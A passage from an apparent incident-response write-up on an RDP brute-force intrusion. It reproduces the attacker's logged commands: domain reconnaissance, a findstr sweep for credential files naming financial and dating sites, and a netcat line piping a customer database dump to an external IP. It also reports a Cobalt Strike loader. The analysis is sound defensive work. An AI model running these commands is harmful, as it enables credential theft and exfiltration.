2021-09-05T12:51:06.3268057+00:00, 1, "C:\Windows\system32\NOTEPAD.EXE" C:\Users\Administrator\Downloads\nc111nt\readme.txt, C:\Windows\Explorer.EXE
2021-09-05T12:51:32.0541612+00:00, 1, "C:\Program Files\Google\Chrome\Application\chrome.exe", C:\Windows\Explorer.EXE
2021-09-05T12:51:32.9370033+00:00, 1, C:\Windows\System32\CompPkgSrv.exe -Embedding, C:\Windows\system32\svchost.exe -k DcomLaunch -p
2021-09-05T12:51:42.8764679+00:00, 1, "C:\Windows\system32\cmd.exe", C:\Windows\Explorer.EXE
2021-09-05T12:52:18.9573511+00:00, 1, "C:\Windows\System32\cmd.exe", C:\Windows\Explorer.EXE
2021-09-05T12:52:20.4110984+00:00, 1, nc, "C:\Windows\System32\cmd.exe"
2021-09-05T12:55:30.3393755+00:00, 1, nc -w 3 3.16.42.241 4444, "C:\Windows\System32\cmd.exe"
2021-09-05T12:56:49.8580724+00:00, 1, C:\Windows\system32\TSTheme.exe -Embedding, C:\Windows\system32\svchost.exe -k DcomLaunch -p
2021-09-05T12:56:50.0053729+00:00, 1, taskhostw.exe KEYROAMING, C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule
2021-09-05T13:16:40.2815248+00:00, 1, C:\Windows\System32\rundll32.exe shell32.dll,SHCreateLocalServerRunDll {9BA05972-F6A8-11CF-A442-00A0C90A8F39} -Embedding, C:\Windows\system32\svchost.exe -k DcomLaunch -p
```

We've struck a veritable goldmine within the trove of logged activities. The script's output has laid bare a series of actions that are most likely the handiwork of the attacker. This wealth of information provides us with a clearer picture of the tactics employed, tools used, and perhaps even the intent behind the attack. Now for a little while It's time to shift our focus toward unraveling the mystery of Initial Access.

### Initial Access

If the logs are not deleted by the attacker, we can determine the successful/unsuccessful login attempts from the log sources below:

- Windows Security Logs
- Microsoft-Windows-Terminal-Services-RemoteConnectionManager
- Microsoft-Windows-TerminalServices-LocalSessionManager
- Sysmon Operational

Let's look into the RDP connections. Here, we can search for the previously found malicious IP address **`3.16.42.241`** because we are looking for initial access. 

You might wonder why we began by investigating RDP connections as the starting point for Initial Access. When we previously encountered the 'end.ps1' script in the process creation event, the TerminalSessionId was identified as 2. This observation led us to conclude that the process was spawned within an RDP session, forming the basis for our Initial Access investigation. Now, let's continue where we left off and delve deeper into our analysis.

As seen in the event, the hacker has accessed the system via an RDP connection.

![Untitled](/assets/img/analyzing-suspicious-powershell-execution/Untitled10.png)

As observed in the event, the hacker has gained access to the system via an RDP connection.

We need to determine if the hacker already had knowledge of the password when gaining access to the system or if they conducted a Brute Force attack. To ascertain this information, we should examine events with the ID 4625 in the Security logs.

The 4625 security event, also known as 'Logon Failure,' is a crucial event that signifies failed login attempts on a system. It provides essential information such as the username, the source IP address, the reason for the failure, and the type of logon method used. Analyzing this event is vital in understanding potential security breaches and unauthorized access attempts within the system. For further in-depth insights, you may refer to the following resource: [link](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4625).

![Untitled](/assets/img/analyzing-suspicious-powershell-execution/Untitled11.png)

We have identified a multitude of failed login attempts originating from a malicious IP address. It is evident from this activity that the hacker employed a Brute Force attack method to gain unauthorized access through RDP. Subsequently, they were able to discover both the username and password. This occurrence is likely attributed to the simplicity or default nature of the username and password combination, highlighting the importance of robust security practices in username and password management.

### Execution

We can now revisit the malicious commands that were executed. We can observe and summarize the malicious commands in the following sequence.

```powershell
Time, Event ID, CommandLine, Parent CommandLine
2021-09-05T12:31:03.8084192+00:00, 1, cmd.exe new1.bat, "C:\Windows\system32\cmd.exe"
2021-09-05T12:31:21.1660301+00:00, 1, nltest /domain_trusts, cmd.exe new1.bat
2021-09-05T12:31:21.1952914+00:00, 1, net view /all, cmd.exe new1.bat
2021-09-05T12:31:33.3000905+00:00, 1, reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall, cmd.exe new1.bat
2021-09-05T12:31:33.3367931+00:00, 1, net view /all /domain, cmd.exe new1.bat
2021-09-05T12:31:45.4487600+00:00, 1, net group "domain admins" /domain, cmd.exe new1.bat
2021-09-05T12:31:45.4698009+00:00, 1, C:\Windows\system32\net1 group "domain admins" /domain, net group "domain admins" /domain
2021-09-05T12:31:45.4966263+00:00, 1, net session, cmd.exe new1.bat
2021-09-05T12:31:45.5080602+00:00, 1, C:\Windows\system32\net1 session, net session
2021-09-05T12:31:45.5326700+00:00, 1, net user, cmd.exe new1.bat
2021-09-05T12:31:45.5511284+00:00, 1, C:\Windows\system32\net1 user, net user
2021-09-05T12:31:45.5799266+00:00, 1, systeminfo, cmd.exe new1.bat
2021-09-05T12:31:50.0180596+00:00, 1, ipconfig /all, cmd.exe new1.bat
2021-09-05T12:31:50.1400010+00:00, 1, netstat -an, cmd.exe new1.bat
2021-09-05T12:31:50.4460146+00:00, 1, net config workstation, cmd.exe new1.bat
2021-09-05T12:31:50.4651337+00:00, 1, C:\Windows\system32\net1 config workstation, net config workstation
2021-09-05T12:31:50.5052026+00:00, 1, ipconfig, cmd.exe new1.bat
2021-09-05T12:31:50.5548538+00:00, 1, tasklist, cmd.exe new1.bat
2021-09-05T12:31:50.8863188+00:00, 1, findstr /m whoer.net *, cmd.exe new1.bat
2021-09-05T12:31:50.9270285+00:00, 1, findstr /m fedex.com *, cmd.exe new1.bat
2021-09-05T12:31:50.9550196+00:00, 1, findstr /m ups.com *, cmd.exe new1.bat
2021-09-05T12:31:50.9833356+00:00, 1, findstr /m sendspace.com *, cmd.exe new1.bat
2021-09-05T12:31:51.0125906+00:00, 1, findstr /m indeed.com *, cmd.exe new1.bat
2021-09-05T12:31:51.0420045+00:00, 1, findstr /m craiglist.org *, cmd.exe new1.bat
2021-09-05T12:31:51.0661670+00:00, 1, findstr /m swiftunlocks.com *, cmd.exe new1.bat
2021-09-05T12:31:51.0943186+00:00, 1, findstr /m vzw.com *, cmd.exe new1.bat
2021-09-05T12:31:51.1219193+00:00, 1, findstr /m verizonwireless.com *, cmd.exe new1.bat
2021-09-05T12:31:51.1461812+00:00, 1, findstr /m verizon.com *, cmd.exe new1.bat
2021-09-05T12:31:51.1731897+00:00, 1, findstr /m datehookup.com *, cmd.exe new1.bat
2021-09-05T12:31:51.2029468+00:00, 1, findstr /m att.com *, cmd.exe new1.bat
2021-09-05T12:31:51.2613480+00:00, 1, findstr /m datingdirect.com *, cmd.exe new1.bat
2021-09-05T12:31:51.2882587+00:00, 1, findstr /m mail.live.com *, cmd.exe new1.bat
2021-09-05T12:31:51.3054478+00:00, 1, findstr /m meetic.com *, cmd.exe new1.bat
2021-09-05T12:31:51.3335354+00:00, 1, findstr /m lovearts.com *, cmd.exe new1.bat
2021-09-05T12:31:51.3576931+00:00, 1, findstr /m amateurmatch.com *, cmd.exe new1.bat
2021-09-05T12:31:51.3870739+00:00, 1, findstr /m meetme.com *, cmd.exe new1.bat
2021-09-05T12:31:51.4428256+00:00, 1, findstr /m cupid.com *, cmd.exe new1.bat
2021-09-05T12:31:51.4644904+00:00, 1, findstr /m accounts.google.com *, cmd.exe new1.bat
2021-09-05T12:31:51.4921744+00:00, 1, findstr /m sprint.com *, cmd.exe new1.bat
2021-09-05T12:31:51.5134180+00:00, 1, findstr /m login.yahoo.com *, cmd.exe new1.bat
2021-09-05T12:31:51.5388885+00:00, 1, findstr /m muddymatches.co.uk *, cmd.exe new1.bat
2021-09-05T12:31:51.5668818+00:00, 1, findstr /m steampowered.com *, cmd.exe new1.bat
2021-09-05T12:31:51.5920452+00:00, 1, findstr /m officedepot.com *, cmd.exe new1.bat
2021-09-05T12:31:51.6170895+00:00, 1, findstr /m zoosk.com *, cmd.exe new1.bat
2021-09-05T12:31:51.6401886+00:00, 1, findstr /m target.com *, cmd.exe new1.bat
2021-09-05T12:31:51.6674999+00:00, 1, findstr /m match.com *, cmd.exe new1.bat
2021-09-05T12:31:51.6966975+00:00, 1, findstr /m friendfinder.com *, cmd.exe new1.bat
2021-09-05T12:31:51.7257782+00:00, 1, findstr /m mysinglefriend.com *, cmd.exe new1.bat
2021-09-05T12:31:51.7517771+00:00, 1, findstr /m gay.com *, cmd.exe new1.bat
2021-09-05T12:31:51.7744586+00:00, 1, findstr /m christianconnection.com *, cmd.exe new1.bat
2021-09-05T12:31:51.8000385+00:00, 1, findstr /m shaadi.com *, cmd.exe new1.bat
2021-09-05T12:31:51.8238720+00:00, 1, findstr /m jdate.com *, cmd.exe new1.bat
2021-09-05T12:31:51.8471258+00:00, 1, findstr /m qvc.com *, cmd.exe new1.bat
2021-09-05T12:31:51.8704098+00:00, 1, findstr /m apple.comdssid *, cmd.exe new1.bat
2021-09-05T12:31:51.8949001+00:00, 1, findstr /m beacon.walmart.com *, cmd.exe new1.bat
2021-09-05T12:31:51.9547018+00:00, 1, findstr /m lowes.com *, cmd.exe new1.bat
2021-09-05T12:31:51.9829683+00:00, 1, findstr /m dell.com *, cmd.exe new1.bat
2021-09-05T12:31:52.0098965+00:00, 1, findstr /m amazon.comsession *, cmd.exe new1.bat
2021-09-05T12:31:52.0401961+00:00, 1, findstr /m ebay.comnonsession *, cmd.exe new1.bat
2021-09-05T12:31:52.1102466+00:00, 1, findstr /m bestbuy.comcontext_id *, cmd.exe new1.bat
2021-09-05T12:31:52.1313873+00:00, 1, findstr /m farfetch.com *, cmd.exe new1.bat
2021-09-05T12:31:52.1578316+00:00, 1, findstr /m newegg.coms_per *, cmd.exe new1.bat
2021-09-05T12:31:52.1831523+00:00, 1, findstr /m bhphotovideo.com *, cmd.exe new1.bat
2021-09-05T12:31:52.2037686+00:00, 1, findstr /m sears.com *, cmd.exe new1.bat
2021-09-05T12:31:52.2294217+00:00, 1, findstr /m airbnb.com *, cmd.exe new1.bat
2021-09-05T12:31:52.2583948+00:00, 1, findstr /m overstock.com *, cmd.exe new1.bat
2021-09-05T12:31:52.2838589+00:00, 1, findstr /m perfectmoney.com *, cmd.exe new1.bat
2021-09-05T12:31:52.3164280+00:00, 1, findstr /m aib.ie *, cmd.exe new1.bat
2021-09-05T12:31:52.3451621+00:00, 1, findstr /m moneybookers.com *, cmd.exe new1.bat
2021-09-05T12:31:52.3690143+00:00, 1, findstr /m payeer.com *, cmd.exe new1.bat
2021-09-05T12:31:52.3900271+00:00, 1, findstr /m open24.ie *, cmd.exe new1.bat
2021-09-05T12:31:52.4149289+00:00, 1, findstr /m liqpay.com *, cmd.exe new1.bat
2021-09-05T12:31:52.4768769+00:00, 1, findstr /m barclaycardus.com *, cmd.exe new1.bat
2021-09-05T12:31:52.5031539+00:00, 1, findstr /m coinbase.com *, cmd.exe new1.bat
2021-09-05T12:31:52.5254478+00:00, 1, findstr /m chase.com *, cmd.exe new1.bat
2021-09-05T12:31:52.5427721+00:00, 1, findstr /m capitalone.com *, cmd.exe new1.bat
2021-09-05T12:31:52.5705149+00:00, 1, findstr /m paysurfer.com *, cmd.exe new1.bat
2021-09-05T12:31:52.6211631+00:00, 1, findstr /m wellsfargo.com *, cmd.exe new1.bat
2021-09-05T12:31:52.6487945+00:00, 1, findstr /m suntrust.com *, cmd.exe new1.bat
2021-09-05T12:31:52.7217792+00:00, 1, findstr /m dwolla.com *, cmd.exe new1.bat
2021-09-05T12:31:52.7463539+00:00, 1, findstr /m gopayment.com *, cmd.exe new1.bat
2021-09-05T12:31:52.7641174+00:00, 1, findstr /m .v.me *, cmd.exe new1.bat
2021-09-05T12:31:52.7825803+00:00, 1, findstr /m westernunion.com *, cmd.exe new1.bat
2021-09-05T12:31:52.8112823+00:00, 1, findstr /m paypal.comcookie_check *, cmd.exe new1.bat
2021-09-05T12:31:52.8324562+00:00, 1, findstr /m entropay.com *, cmd.exe new1.bat
2021-09-05T12:31:52.8719142+00:00, 1, findstr /m wepay.com *, cmd.exe new1.bat
2021-09-05T12:31:52.8990071+00:00, 1, findstr /m account.skrill.com *, cmd.exe new1.bat
2021-09-05T12:31:52.9203107+00:00, 1, findstr /m 2checkout.com *, cmd.exe new1.bat
2021-09-05T12:31:52.9556973+00:00, 1, findstr /m neteller.com *, cmd.exe new1.bat
2021-09-05T12:31:53.0111759+00:00, 1, findstr /m cookie_check.paypal.com *, cmd.exe new1.bat
2021-09-05T12:31:53.0465721+00:00, 1, C:\WINDOWS\system32\cmd.exe /S /D /c" TYPE win_install.log.txt ", cmd.exe new1.bat
2021-09-05T12:32:24.3645426+00:00, 1, ipconfig, cmd.exe new1.bat

2021-09-05T12:32:42.1712703+00:00, 1, "C:\Users\Administrator\Downloads\Advanced_Port_Scanner_2.5.3869.exe", "C:\Program Files\Google\Chrome\Application\chrome.exe"
2021-09-05T12:32:42.9236418+00:00, 1, "C:\Users\ADMINI~1\AppData\Local\Temp\2\is-BNNEE.tmp\Advanced_Port_Scanner_2.5.3869.tmp" /SL5="$1102E2,19769177,139776,C:\Users\Administrator\Downloads\Advanced_Port_Scanner_2.5.3869.exe", "C:\Users\Administrator\Downloads\Advanced_Port_Scanner_2.5.3869.exe"
2021-09-05T12:33:05.2372213+00:00, 1, "C:\Users\ADMINI~1\AppData\Local\Temp\2\Advanced Port Scanner 2\advanced_port_scanner.exe" /portable "C:/Users/Administrator/Downloads/" /lng en_us, "C:\Users\ADMINI~1\AppData\Local\Temp\2\is-BNNEE.tmp\Advanced_Port_Scanner_2.5.3869.tmp" /SL5="$1102E2,19769177,139776,C:\Users\Administrator\Downloads\Advanced_Port_Scanner_2.5.3869.exe"
2021-09-05T12:39:14.9126030+00:00, 1, "C:\Windows\System32\explorer.exe" \\172.31.23.102, "C:\Users\ADMINI~1\AppData\Local\Temp\2\Advanced Port Scanner 2\advanced_port_scanner.exe" /portable "C:/Users/Administrator/Downloads/" /lng en_us

2021-09-05T12:43:23.0839733+00:00, 1, "C:\Windows\System32\WindowsPowerShell\v1.0\powershell_ise.exe" "C:\Users\Public\Documents\end.ps1", C:\Windows\Explorer.EXE
2021-09-05T12:43:45.3925137+00:00, 1, "C:\Windows\System32\WindowsPowerShell\v1.0\powershell_ise.exe" "C:\Users\Public\Documents\end.ps1", C:\Windows\Explorer.EXE
2021-09-05T12:44:06.8425008+00:00, 1, "C:\Windows\system32\NOTEPAD.EXE" C:\Users\Public\Documents\endpoint.txt, C:\Windows\Explorer.EXE
2021-09-05T12:45:00.4355424+00:00, 1, "C:\Windows\System32\WindowsPowerShell\v1.0\powershell_ise.exe" "C:\Users\Public\Documents\end.ps1", C:\Windows\Explorer.EXE
2021-09-05T12:47:42.0709584+00:00, 1, "C:\Windows\regedit.exe", C:\Windows\Explorer.EXE
2021-09-05T12:49:31.1083835+00:00, 1, "C:\Windows\System32\WindowsPowerShell\v1.0\powershell_ise.exe" "C:\Users\Public\Documents\end.ps1", C:\Windows\Explorer.EXE
2021-09-05T12:50:09.8753361+00:00, 1, "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -w hidden -nop .\end.ps1, "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
2021-09-05T12:50:12.3726334+00:00, 1, "c:\windows\syswow64\windowspowershell\v1.0\powershell.exe" -Version 5.1 -s -NoLogo -NoProfile, "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -w hidden -nop .\end.ps1

2021-09-05T12:51:06.3268057+00:00, 1, "C:\Windows\system32\NOTEPAD.EXE" C:\Users\Administrator\Downloads\nc111nt\readme.txt, C:\Windows\Explorer.EXE
2021-09-05T12:52:20.4110984+00:00, 1, nc, "C:\Windows\System32\cmd.exe"
2021-09-05T12:55:30.3393755+00:00, 1, nc -w 3 3.16.42.241 4444, "C:\Windows\System32\cmd.exe"
```

Here are the malicious commands have been run accoring to commands above:

1. New1.bat
2. Advanced_Port_Scanner_2.5.3869.exe
3. end.ps1
4. NetCat for Windows

#### New1.bat

The batch file appears to have executed a series of commands that involve searching for various domain names within the file system. This behavior suggests that the attacker might be trying to identify files or documents containing sensitive information, particularly related to user passwords.

Often, users tend to store their passwords in text files for easy reference, and attackers are aware of this common practice. By searching for domain names, the attacker is likely hoping to discover any text files or documents that contain login credentials, which can then be used for further malicious activities.

In essence, the batch file's actions indicate an attempt to harvest potentially valuable information, such as login credentials, from the target system. This information can be leveraged for unauthorized access, data theft, or other malicious purposes. It's essential to investigate such activities promptly and take appropriate security measures to mitigate potential risks.

```bash
nltest /domain_trusts
net view /all
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall
net view /all /domain
net group "domain admins" /domain
net session
net user
systeminfo
ipconfig /all
netstat -an
net config workstation
ipconfig
tasklist
findstr /m whoer.net *
findstr /m fedex.com *
findstr /m ups.com *
findstr /m sendspace.com *
findstr /m indeed.com *
findstr /m craiglist.org *
findstr /m swiftunlocks.com *
findstr /m vzw.com *
findstr /m verizonwireless.com *
findstr /m verizon.com *
findstr /m datehookup.com *
findstr /m att.com *
findstr /m datingdirect.com *
findstr /m mail.live.com *
findstr /m meetic.com *
findstr /m lovearts.com *
findstr /m amateurmatch.com *
findstr /m meetme.com *
findstr /m cupid.com *
findstr /m accounts.google.com *
findstr /m sprint.com *
findstr /m login.yahoo.com *
findstr /m muddymatches.co.uk *
findstr /m steampowered.com *
findstr /m officedepot.com *
findstr /m zoosk.com *
findstr /m target.com *
findstr /m match.com *
findstr /m friendfinder.com *
findstr /m mysinglefriend.com *
findstr /m gay.com *
findstr /m christianconnection.com *
findstr /m shaadi.com *
findstr /m jdate.com *
findstr /m qvc.com *
findstr /m apple.comdssid *
findstr /m beacon.walmart.com *
findstr /m lowes.com *
findstr /m dell.com *
findstr /m amazon.comsession *
findstr /m ebay.comnonsession *
findstr /m bestbuy.comcontext_id *
findstr /m farfetch.com *
findstr /m newegg.coms_per *
findstr /m bhphotovideo.com *
findstr /m sears.com *
findstr /m airbnb.com *
findstr /m overstock.com *
findstr /m perfectmoney.com *
findstr /m aib.ie *
findstr /m moneybookers.com *
findstr /m payeer.com *
findstr /m open24.ie *
findstr /m liqpay.com *
findstr /m barclaycardus.com *
findstr /m coinbase.com *
findstr /m chase.com *
findstr /m capitalone.com *
findstr /m paysurfer.com *
findstr /m wellsfargo.com *
findstr /m suntrust.com *
findstr /m dwolla.com *
findstr /m gopayment.com *
findstr /m .v.me *
findstr /m westernunion.com *
findstr /m paypal.comcookie_check *
findstr /m entropay.com *
findstr /m wepay.com *
findstr /m account.skrill.com *
findstr /m 2checkout.com *
findstr /m neteller.com *
findstr /m cookie_check.paypal.com *
C:\WINDOWS\system32\cmd.exe /S /D /c" TYPE win_install.log.txt "
ipconfig
```

As observed in Event ID 11 (File Creation), the "new1.bat" file was created and subsequently deleted from its original directory. However, we were able to reconstruct the content of the file by examining process creation events.

![Untitled](/assets/img/analyzing-suspicious-powershell-execution/Untitled12.png)

#### Advanced Port Scanner

Advanced Port Scanner is a network scanning tool commonly used for identifying open ports and devices on a network. This tool allows the user to assess the security of networked systems by identifying potential vulnerabilities and gathering information about networked devices. It operates by sending network requests to target IP addresses and analyzing the responses received.

The connections observed under Sysmon Event ID 3 represent the connection attempts made by Advanced Port Scanner between targeted devices and ports. Advanced Port Scanner attempts to communicate with specific IP addresses and port numbers while performing network scanning operations. These connections serve the purpose of assessing network security and identifying potential vulnerabilities.

![Untitled](/assets/img/analyzing-suspicious-powershell-execution/Untitled13.png)

#### end.ps1

It was observed that end.ps1 was executed during the incident response. Upon analysis, it was determined that this script was, in fact, a PowerShell code running Cobalt Strike in memory. This information supplements the previous analysis.

#### NetCat for Windows

Noteworthy piece of evidence is found in the command history retrieved from the alert. The history reveals the following command: **`nc.exe -w 3 3.16.42.144 4444 < user-db-backup.sql`**.

Additionally, a corresponding event image has been included, which highlights a connection established with a malicious IP address (**`3.16.42.144`**). This event corresponds to Sysmon event ID 3 (network connection detected) and signifies network-based activity. It is highly suggestive of command and control communication or potential data exfiltration.

![Untitled](/assets/img/analyzing-suspicious-powershell-execution/Untitled15.png)

Moreover, a visual representation of the transmitted file has been provided. Within the file lies a SQL database dump containing a 'customers' table. This table contains essential customer information, including customer numbers, customer names, and contact details.

![Untitled](/assets/img/analyzing-suspicious-powershell-execution/Untitled16.png)

These findings collectively underscore the gravity of the situation, suggesting that the incident may involve unauthorized access, data exfiltration, or other malicious activities potentially orchestrated by external threat actors. Immediate actions, including containment and further investigation, are warranted to address this security breach effectively.

## Containment

During the forensic examination phase, it is crucial to avoid shutting down an open device or powering on a closed device to preserve potential evidence. Consequently, disconnecting the device from the network emerges as a highly recommended method to sever the attacker's access and curtail the spread of the attack.

## Eradication

- The immediate action to take is changing the Administrator account password. This password should be updated to a strong, unique, and secure one to prevent unauthorized access.
- Evaluate the necessity of the Administrator account's presence within the Remote Desktop Users group. If it's determined that the Administrator account doesn't require access, it should be promptly removed from the group.
- Identify and remove all files downloaded by the attacker from the file system.
- Ensure that all systems are kept up to date with the latest security patches and updates.
- Remove any remaining malicious software from system.

## Lesson Learned

- Avoid exposing Remote Desktop Protocol (RDP) services directly to the internet. Instead, consider using VPNs or secure gateway solutions. If RDP must be exposed, implement IP whitelisting to restrict access to trusted sources.
- Enforce rigorous password policies that discourage the use of generic or easily guessable passwords. Encourage the use of complex, unique passwords. Implement multi-factor authentication (MFA) for added security.
- Conduct periodic audits of user groups to ensure that only individuals requiring remote access are granted such privileges. Remove users who no longer need remote access to minimize potential security risks.
- Invest in cybersecurity awareness and training programs for employees to help them recognize and report suspicious activities promptly. Educated employees are a crucial line of defense.

## Extended Incident Overview

### MITRE ATT&CK Navigator

![Untitled](/assets/img/analyzing-suspicious-powershell-execution/Untitled17.png)

### Cyber Kill Chain

| Cyber Kill Chain Steps | Technique used in the attack |
| --- | --- |
| Reconnaissance | Port Scanning (Advanced Port Scanner) |
| Weaponization |  |
| Delivery | Via RDP Service |
| Exploitation | Brute force |
| Installation | Cobalt Strike (end.ps1) |
| Command and Control |  |
| Action on Objectives | Exfiltration DB backup (NetCat) |

### IOCs

- 3.16.42.241
- end.ps1
- new1.bat
- Advanced_Port_Scanner_2.5.3869.exe
- nc111nt.zip